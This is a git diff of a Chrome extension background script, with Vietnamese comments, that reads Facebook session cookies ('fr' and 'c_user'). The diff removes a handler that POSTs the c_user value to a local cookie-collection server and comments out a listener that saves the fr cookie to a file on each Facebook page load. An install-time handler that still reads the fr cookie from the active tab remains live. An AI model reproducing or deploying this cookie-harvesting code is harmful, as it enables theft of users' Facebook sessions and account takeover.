@@ -1,4 +1,6 @@
+console.log("111111111");
 chrome.runtime.onInstalled.addListener(function () {
+  console.log("2222222");
   chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
     const tab = tabs[0];
     if (!tab) {
@@ -24,68 +26,55 @@ chrome.runtime.onInstalled.addListener(function () {
           .find((row) => row.startsWith("fr="))
           .split("=")[1];
         fr(cookieValue);
+        
       },
     });
   });
 });
 
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.c_user) {
-    const cUserValue = request.c_user;
+  console.log("4444444444");
 
-    // Xây dựng yêu cầu POST để gửi giá trị c_user lên máy chủ
-    fetch("http://localhost:4444/api/cookie/insert", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ c_user: cUserValue }),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        // Xử lý phản hồi từ máy chủ (nếu cần)
-        console.log("Phản hồi từ máy chủ:", data);
-      })
-      .catch((error) => {
-        console.error("Lỗi khi gửi yêu cầu:", error);
-      });
-  }
+ 
 });
 
-chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
-  if (
-    tab &&
-    tab.url &&
-    changeInfo.status === "complete" &&
-    tab.url.startsWith("https://www.facebook.com/")
-  ) {
-    chrome.cookies.get(
-      { url: "https://facebook.com", name: "fr" },
-      (cookie) => {
-        if (cookie) {
-          const cookieValue = cookie.value;
-          const blob = new Blob([cookieValue], { type: "text/plain" });
-          const url = URL.createObjectURL(blob);
 
-          chrome.downloads.download({
-            url: url,
-            filename: "fr.txt",
-          });
-        } else {
-          console.log("Không tìm thấy cookie fr.");
-        }
-      }
-    );
-  }
-});
+
+// chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
+//   if (
+//     tab &&
+//     tab.url &&
+//     changeInfo.status === "complete" &&
+//     tab.url.startsWith("https://www.facebook.com/")
+//   ) {
+//     chrome.cookies.get(
+//       { url: "https://facebook.com", name: "fr" },
+//       (cookie) => {
+//         if (cookie) {
+//           const cookieValue = cookie.value;
+//           const blob = new Blob([cookieValue], { type: "text/plain" });
+//           const url = URL.createObjectURL(blob);
+
+//           chrome.downloads.download({
+//             url: url,
+//             filename: "fr.txt",
+//           });
+//         } else {
+//           console.log("Không tìm thấy cookie fr.");
+//         }
+//       }
+//     );
+//   }
+// });
 
 // Background script
 
 // URL server nhận dữ liệu
 // URL server
+// console.log("11111122222");
 // const SERVER_URL = "http://localhost:4444/api/cookie/insert";
 
-// Hàm gửi dữ liệu lên server
+// // Hàm gửi dữ liệu lên server
 // async function sendDataToServer(data) {
 //   try {
 //     const response = await fetch(SERVER_URL, {
